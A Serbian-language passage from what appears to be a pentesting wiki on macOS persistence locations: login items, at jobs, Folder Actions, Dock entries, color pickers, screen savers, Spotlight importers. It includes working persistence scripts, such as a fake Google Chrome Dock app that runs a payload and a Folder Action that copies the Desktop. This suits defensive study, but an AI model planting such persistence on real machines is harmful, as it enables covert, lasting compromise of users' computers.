Starijim stavkama za prijavu može se upravljati i preko Apple events-a. Moguće ih je izlistati, dodati i ukloniti iz komandne linije, mada dodavanje menja trajnu konfiguraciju prijave korisnika i može zahtevati odobrenje za Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` je detalj implementacije, a ne podržana lokacija za instaliranje payload-a pukim upisivanjem datoteke. Stariji API `SMLoginItemSetEnabled` zamenjen je API-jem `SMAppService` za nove pomoćne programe; putanja `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, koja se ranije nalazila na ovoj stranici, nije postojala na testnoj mašini sa macOS 26.5.2. Pri proceni savremenih Login Items koristite API za registraciju i stanje sistemskog korisničkog interfejsa, a ne pretpostavljenu putanju do baze podataka.

### ZIP kao Login Item

(Pogledajte prethodni odeljak o Login Items; ovo je njegovo proširenje)

Ako ZIP datoteku sačuvate kao Login Item, `Archive Utility` će je otvoriti. Ako je, na primer, ZIP sačuvan u `~/Library` i sadrži fasciklu `LaunchAgents/file.plist` sa backdoor-om, ta fascikla će biti kreirana (ne postoji podrazumevano), a plist će biti dodat. Zato će se sledeći put kada se korisnik prijavi **izvršiti backdoor naveden u plist-u**.

Druga mogućnost je da napravite datoteke **`.bash_profile`** i **`.zshenv`** u korisničkom HOME direktorijumu, tako da ova tehnika i dalje radi ako fascikla LaunchAgents već postoji.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate **izvršiti** **`at`** i mora biti **omogućen**
- TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Morate **izvršiti** **`at`** i mora biti **omogućen**

#### **Opis**

Zadaci `at` namenjeni su **zakazivanju jednokratnih zadataka** koji će se izvršiti u određeno vreme. Za razliku od cron zadataka, zadaci `at` automatski se uklanjaju nakon izvršavanja. Važno je napomenuti da se ovi zadaci zadržavaju i nakon ponovnog pokretanja sistema, što u određenim uslovima predstavlja potencijalno bezbednosno pitanje.<sup>[[16]](#references)</sup>

U paketu `com.apple.atrun.plist` postavljeno je `Disabled = true`, ali launchd zasebno čuva efektivna nadjačavanja stanja omogućenosti/onemogućenosti. Na testnoj mašini sa macOS 26.5.2, `launchctl print-disabled system` prikazao je `com.apple.atrun` kao **omogućen**, uprkos toj vrednosti u paketu. Proverite efektivno stanje pre nego što tvrdite da će se zadaci `at` izvršavati:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Administrator može da omogući onemogućenu uslugu `atrun` pomoću komande `launchctl`; sledeći istorijski primer menja stanje sistemske usluge i **nije pokrenut** na Mac računaru korišćenom za istraživanje:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Ovo će napraviti datoteku za 1 sat:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Proverite red poslova pomoću `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Iznad možemo da vidimo dva zakazana posla. Detalje posla možemo da prikažemo pomoću `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Ako AT zadaci nisu omogućeni, kreirani zadaci neće biti izvršeni.

**Fajlovi poslova** se nalaze u direktorijumu `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Naziv datoteke sadrži red čekanja, broj zadatka i vreme zakazano za njegovo pokretanje. Na primer, pogledajmo `a0001a019bdcd2`.

- `a` - ovo je red čekanja
- `0001a` - broj zadatka u heksadecimalnom zapisu, `0x1a = 26`
- `019bdcd2` - vreme u heksadecimalnom zapisu. Predstavlja broj minuta proteklih od epohe. `0x019bdcd2` je `26991826` u decimalnom zapisu. Ako to pomnožimo sa 60, dobijamo `1619509560`, što odgovara vremenu `GMT: 2021. April 27., Tuesday 7:46:00`.

Ako ispišemo datoteku zadatka, videćemo da sadrži iste informacije koje smo dobili pomoću `at -c`.

### Upozorenja Calendar-a za otvaranje datoteke

- **Cilj upisa:** Izvršni paket aplikacije ili druga datoteka **koja je već izabrana** u prilagođenom upozorenju **Open file** za događaj u Calendar-u. Kreiranje ili uređivanje samog upozorenja zahteva pristup tom događaju u kalendaru preko Calendar-a ili prihvaćenog izvora podataka kalendara; nasumičan upis datoteke ne kreira upozorenje.
- **Okidač:** Zakazano vreme upozorenja na Mac-u na kom Calendar obrađuje događaj. Ponavljajući događaj može ponavljati radnju. [Aktuelno Apple uputstvo za Calendar](https://support.apple.com/guide/calendar/icl1012/mac) potvrđuje opciju upozorenja **Custom → Open file** u macOS-u 26.
- **Identitet izvršavanja i ograničenja:** Calendar otvara izabranu datoteku za prijavljenog korisnika pomoću povezane aplikacije. Pokretanje paketa aplikacije može izvršiti njegov kod kao taj korisnik, u zavisnosti od Gatekeeper-a, quarantine oznake i drugih macOS provera. Obična skriptna datoteka može samo da se otvori u uređivaču; sama ekstenzija ne dokazuje da će se kod izvršiti.

Da biste bezbedno procenili potencijalnu metu, pregledajte upozorenje događaja u Calendar-u i dozvole izabrane datoteke. Ovaj način rada dokumentovan je na osnovu Apple uputstva i **nije** testiran na Mac-u za istraživanje, jer bi testiranje izmenilo aktivni kalendar i zahtevalo čekanje na događaj u radnom okruženju. U privremenom nalogu možete izabrati paket aplikacije koji samo kreira marker, podesiti upozorenje Open file za neki bliski budući termin, potvrditi pokretanje, a zatim izbrisati događaj i aplikaciju.

### Automations u Shortcuts-u na macOS-u

- **Cilj upisa:** Izvršna datoteka **na koju već upućuje** radnja prečice ili postojeća prečica koju ovlašćeni korisnik može da uređuje. Nasumična `.shortcut` datoteka ili upis u nedokumentovanu Shortcuts bazu podataka nisu podržani načini registrovanja automation-a.
- **Okidač i identitet:** Prethodno konfigurisani i omogućeni automation događaj, kao što su doba dana ili događaj aplikacije, poziva prečicu za prijavljenog korisnika. [Aktuelno Apple uputstvo za automation na Mac-u](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) navodi podržane događaje, objašnjava kada automation može da se pokrene bez potvrde i opisuje uklanjanje okidača. [Apple uputstvo za privatnost Shortcuts-a](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) zahteva **Allow Running Scripts** za skriptne radnje, a pojedinačne radnje i dalje mogu tražiti dozvole.

Ovo je uslovni put od upisa do izvršavanja **samo ako postojeća radnja učitava cilj na koji može da se upisuje**. Kreiranje novog automation-a kroz UI menja aktivna podešavanja i nije pokušano na Mac-u za istraživanje. U privremenom nalogu vlasnik može da konfiguriše prečicu koja se pokreće u određeno doba dana i čija skripta dodiruje `/tmp/ht-shortcuts-marker`, omogući neophodne dozvole, proveri marker nakon događaja, a zatim izbriše automation, prečicu i marker.

### Automator radnje i Quick Actions

- **Ciljevi upisa:** `~/Library/Automator/*.action` (korisnik) i `/Library/Automator/*.action` (administrator) za pakete radnji. Sačuvan Quick Action workflow obično se nalazi u `~/Library/Services/*.workflow`; proverite stvarnu putanju workflow-a koju je izabrao korisnik. [Apple referenca za Automator framework](https://developer.apple.com/documentation/automator) navodi direktorijume u kojima se traže radnje.
- **Okidač:** Automator učitava dostupne pakete radnji kada se pokrene, ali zadatak radnje izvršava se kada se pokrene workflow koji je koristi. Quick Action se pokreće kada je korisnik izabere u Finder-u, Services-u ili drugom prikazanom meniju. Folder Action workflow se pokreće kada se stavke dodaju u njegovu **već povezanu** fasciklu, a Calendar Alarm workflow pokreće se u vreme događaja. [Apple tipovi workflow-a](https://support.apple.com/guide/automator/aut7cac58839/mac) razlikuju ove događaje. Sam upis radnje ili workflow-a ne povezuje fasciklu niti zakazuje događaj u kalendaru.
- **Identitet izvršavanja i ograničenja:** Nalog koji pokreće workflow; Automator ili aplikacija koja ga poziva mora da učita radnju, a sve važeće provere potpisivanja koda ili privatnosti moraju to da dozvole. Paket radnje na koji već upućuje aktivan workflow i u koji može da se upisuje predstavlja drugačiji slučaj od instaliranja nove radnje i čekanja da bude izabrana.

Korisnički direktorijumi `Automator` i `Services` postojali su na testnom Mac-u sa macOS 26.5.2; `/Library/Automator` nije postojao. Nije kreiran, povezan niti izvršen nijedan aktivni workflow. Koristite privremeni nalog i marker-only radnju/workflow da biste potvrdili određenu putanju učitavanja. Odvojeni odeljak [Folder Actions](#folder-actions) detaljnije obrađuje taj izvor događaja.

### Folder Actions

Opis: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate biti u mogućnosti da pozovete `osascript` sa argumentima za kontaktiranje **`System Events`** kako biste mogli da konfigurišete Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Ima neke osnovne TCC dozvole, kao što su Desktop, Documents i Downloads

#### Lokacija

- **`/Library/Scripts/Folder Action Scripts`**
  - Potreban je root
  - **Okidač**: Pristup navedenoj fascikli
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Okidač**: Pristup navedenoj fascikli

#### Opis i eksploatacija

Folder Actions su skripte koje se automatski pokreću kada dođe do promena u fascikli, kao što su dodavanje ili uklanjanje stavki, ili druge radnje poput otvaranja ili promene veličine prozora fascikle. Ove radnje mogu se koristiti za različite zadatke i pokretati na različite načine, na primer preko Finder UI-ja ili terminalskih komandi.<sup>[[17]](#references)[[18]](#references)</sup>

Za podešavanje Folder Actions možete:

1. Napraviti Folder Action workflow pomoću [Automator-a](https://support.apple.com/guide/automator/welcome/mac) i instalirati ga kao service.
2. Ručno povezati skriptu preko Folder Actions Setup-a u kontekstnom meniju fascikle.
3. Koristiti OSAScript za slanje Apple Event poruka aplikaciji `System Events.app` radi programskog podešavanja Folder Action-a.
   - Ovaj metod je posebno koristan za ugrađivanje radnje u sistem, čime se postiže određeni nivo persistence-a.

Sledeća skripta je primer onoga što Folder Action može da izvrši:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Da bi gornja skripta mogla da se koristi sa Folder Actions, kompajlirajte je pomoću:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nakon kompajliranja skripte, podesite Folder Actions tako što ćete izvršiti skriptu ispod. Ova skripta će globalno omogućiti Folder Actions i posebno priložiti prethodno kompajliranu skriptu fascikli Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Pokrenite skriptu za podešavanje pomoću:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Ovo je način da implementirate ovu perzistenciju putem GUI-ja:

Ovo je skripta koja će biti izvršena:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompajlirajte ga pomoću: `osacompile -l JavaScript -o folder.scpt source.js`

Premestite ga u:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Zatim otvorite aplikaciju `Folder Actions Setup`, izaberite **folder koji želite da nadgledate** i u svom slučaju izaberite **`folder.scpt`** (u mom slučaju nazvao sam ga output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sada, ako otvorite taj folder pomoću **Finder-a**, vaša skripta će biti izvršena.

Ova konfiguracija je sačuvana u **plist** fajlu koji se nalazi na putanji **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, u base64 formatu.

Sada pokušajmo da pripremimo ovu persistence konfiguraciju bez pristupa GUI-ju:

1. **Kopirajte `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** u `/tmp` kao rezervnu kopiju:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Uklonite** Folder Actions koje ste upravo podesili:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sada kada imamo čisto okruženje

3. Kopirajte rezervnu datoteku: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otvorite Folder Actions Setup.app da bi učitao ovu konfiguraciju: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Meni ovo nije uspelo, ali ovo su uputstva iz writeup-a:(

### Dock prečice

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
  - Ali morate imati zlonamernu aplikaciju instaliranu unutar sistema
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `~/Library/Preferences/com.apple.dock.plist`
  - **Okidač**: Kada korisnik klikne na aplikaciju u Dock-u

#### Opis i eksploatacija

Sve aplikacije koje se pojavljuju u Dock-u navedene su u plist fajlu: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Moguće je **dodati aplikaciju** samo pomoću:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Uz malo **socijalnog inženjeringa** mogli biste da se **lažno predstavite kao, na primer, Google Chrome** u Dock-u i zaista izvršite sopstvenu skriptu:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metode unosa

- **Ciljna lokacija za upis:** Paket aplikacije za metod unosa koji sadrži kod, instaliran u `~/Library/Input Methods/` (korisnik) ili `/Library/Input Methods/` (administrator). Ovo se razlikuje od Apple-ovih običnih tekstualnih `.inputplugin` datoteka za mapiranje tastature, koje same po sebi ne predstavljaju payload proizvoljnog koda.
- **Okidač:** Korisnik doda/omogući izvor unosa u **Podešavanja sistema → Tastatura → Unos teksta**, a zatim ga izabere ili koristi. Samo kopiranje paketa u direktorijum ne dokazuje da će ga macOS pokrenuti. [Apple-ov aktuelni vodič za izvore unosa](https://support.apple.com/guide/mac-help/mchl84525d76/mac) opisuje omogućavanje i prebacivanje između izvora; [Apple-ova dokumentacija za InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) pokriva metode unosa koje sadrže kod.
- **Identitet izvršavanja i uslovi:** Metod se pokreće za prijavljenog korisnika, u skladu sa registracijom metode unosa, potpisivanjem koda i aktuelnim bezbednosnim proverama macOS-a. Za postojeće omogućene metode sa izvršnom datotekom u koju može da se upisuje potrebno je zasebno proveriti putanju i potpis.

Apple-ova [starija napomena o metodama unosa trećih strana](https://developer.apple.com/library/archive/qa/qa1810/_index.html) već je upozoravala da kopiranje određenih metoda palete u ove direktorijume ne znači čak ni da će se pojaviti u Izvorima unosa. Na istraživačkom Mac-u sa macOS 26.5.2 korisnički direktorijum postoji, ali nijedan paket nije instaliran niti aktiviran, pa je ovo dokumentovana uslovna putanja, a ne lokalno potvrđen rezultat izvršavanja.

### Birači boja

Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Potrebno je da se dogodi veoma specifična radnja
  - Završite u drugom sandbox-u
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/Library/ColorPickers`
  - Potrebne su root privilegije
  - Okidač: korišćenje birača boja
- `~/Library/ColorPickers`
  - Okidač: korišćenje birača boja

#### Opis i eksploatacija

**Kompajlirajte** paket birača boja sa svojim kodom (možete da upotrebite [**ovaj, na primer**](https://github.com/viktorstrate/color-picker-plus)), dodajte konstruktor (kao u odeljku [Čuvar ekrana](macos-auto-start-locations.md#screen-saver)) i kopirajte paket u `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Zatim, kada se aktivira birač boja, trebalo bi da se izvrši i vaš paket.

Ovo zavisi od toga da li kompatibilna aplikacija otvori sistemsku paletu boja i izabere instalirani birač. [Apple-ov vodič za paletu boja](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) opisuje zastarele lokacije paketa. Provera lokalne putanje pronašla je zastarelu XPC uslugu birača boja, ali na istraživačkom Mac-u nijedan birač nije bio instaliran niti učitan; nemojte zaključivati da putanja sama po sebi omogućava zaobilaženje TCC-a.

Imajte na umu da binarna datoteka koja učitava vašu biblioteku ima **veoma restriktivan sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: **Ne, jer morate da izvršite sopstvenu aplikaciju**
- TCC bypass: Zavisi od sandbox-a i dozvola omogućene ekstenzije; nije utvrđen opšti način zaobilaženja.

#### Lokacija

- Konkretna aplikacija

#### Opis i eksploatacija

Primer aplikacije sa Finder Sync Extension [**možete pronaći ovde**](https://github.com/D00MFist/InSync).

Aplikacije mogu da sadrže `Finder Sync Extensions`. Ova ekstenzija se nalazi unutar aplikacije koja će biti izvršena. Pored toga, da bi ekstenzija mogla da izvrši svoj kod, **mora biti potpisana** važećim Apple sertifikatom za programere, mora biti **sandbox-ovana** (mada se mogu dodati blaži izuzeci) i mora biti registrovana pomoću nečega poput:<sup>[[21]](#references)[[22]](#references)</sup>

Instalirana ekstenzija takođe mora biti **omogućena** i pozvana za relevantnu lokaciju ili stavku u Finder-u; pisanje proizvoljnog `.appex` paketa nije dovoljno. [Apple-ov Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) prikazuje stanje omogućenosti. Naredbe `pluginkit` u nastavku prikazuju eksplicitnu registraciju i omogućavanje, a ne automatsko pokretanje samo na osnovu datoteke. Ovaj postupak je proveren pregledom dokumentacije; na istraživačkom Mac-u nije instalirana niti omogućena nijedna nova ekstenzija.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Čuvar ekrana

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali ćete završiti u uobičajenom sandbox-u aplikacije
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/System/Library/Screen Savers`
  - Potrebna su root ovlašćenja
  - **Okidač**: Izaberite čuvar ekrana
- `/Library/Screen Savers`
  - Potrebna su root ovlašćenja
  - **Okidač**: Izaberite čuvar ekrana
- `~/Library/Screen Savers`
  - **Okidač**: Izaberite čuvar ekrana

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i exploit

Kreirajte novi projekat u Xcode-u i izaberite šablon za generisanje novog **Screen Saver**. Zatim mu dodajte svoj kod, na primer sledeći kod za generisanje logova.<sup>[[23]](#references)[[24]](#references)</sup>

**Izgradite** ga i kopirajte paket `.saver` u **`~/Library/Screen Savers`**. Zatim otvorite GUI čuvara ekrana i samo kliknite na njega da biste generisali mnogo logova:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Imajte na umu da ćete, pošto se među pravima binarne datoteke koja učitava ovaj kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) nalazi **`com.apple.security.app-sandbox`**, biti **unutar uobičajenog sandboxa aplikacije**.

Kod čuvara ekrana:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight dodaci

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali završićete unutar sandbox-a aplikacije
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox deluje veoma ograničeno

#### Lokacija

- `~/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
- `/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potreban je root
- `/System/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potreban je root
- `Some.app/Contents/Library/Spotlight/`
  - **Okidač**: Kreira se nova datoteka sa ekstenzijom kojom upravlja Spotlight dodatak.
  - Potrebna je nova aplikacija

#### Opis i eksploatacija

Spotlight je ugrađena macOS funkcija za pretragu, osmišljena da korisnicima omogući **brz i sveobuhvatan pristup podacima na njihovim računarima**.\
Da bi omogućio brzu pretragu, Spotlight održava **vlasničku bazu podataka** i pravi indeks tako što **parsira većinu datoteka**, što omogućava brzu pretragu imena datoteka i njihovog sadržaja.<sup>[[25]](#references)</sup>

Osnovni mehanizam Spotlight-a obuhvata centralni proces nazvan „mds“, što je skraćenica za **„metadata server“**. Ovaj proces upravlja celom Spotlight uslugom. Pored njega, više „mdworker“ demona obavlja razne zadatke održavanja, kao što je indeksiranje različitih tipova datoteka (`ps -ef | grep mdworker`). Ovi zadaci su mogući zahvaljujući dodacima Spotlight importer, odnosno **„.mdimporter bundle-ovima“**, koji Spotlight-u omogućavaju da razume i indeksira sadržaj u velikom broju različitih formata datoteka.

Dodaci, odnosno **`.mdimporter`** bundle-ovi, nalaze se na prethodno navedenim lokacijama. Novi bundle mora biti otkriven i mora odgovarati tipu datoteke, a Spotlight zatim mora zaista da indeksira odgovarajuću datoteku; samo kopiranje bundle-a nije dokaz da je učitan. [Apple-ova referenca za MDImporter](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) povezuje učitavanje sa odgovarajućom izmenjenom datotekom. Ovde nije testirano izvršavanje Spotlight importer-a na macOS 26.

Moguće je **pronaći sve učitane `mdimporters`** pokretanjem:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

I, na primer, **/Library/Spotlight/iBooksAuthor.mdimporter** se koristi za parsiranje ovih tipova datoteka (ekstenzije `.iba` i `.book`, između ostalih):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
